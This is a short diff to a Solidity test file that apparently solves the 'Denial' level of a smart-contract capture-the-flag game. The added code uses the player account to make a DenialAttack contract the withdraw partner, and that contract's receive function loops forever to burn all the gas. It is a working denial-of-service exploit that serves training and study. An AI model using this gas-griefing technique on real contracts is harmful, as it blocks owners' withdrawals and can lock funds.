@@ -17,5 +17,14 @@ contract DenialLevel is SetUpLevelTest {
         denial = Denial(payable(instance));
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        denial.setWithdrawPartner(address(new DenialAttack()));
+        vm.stopPrank();
+    }
+}
+
+contract DenialAttack {
+    receive() external payable {
+        while (true) {}
     }
 }
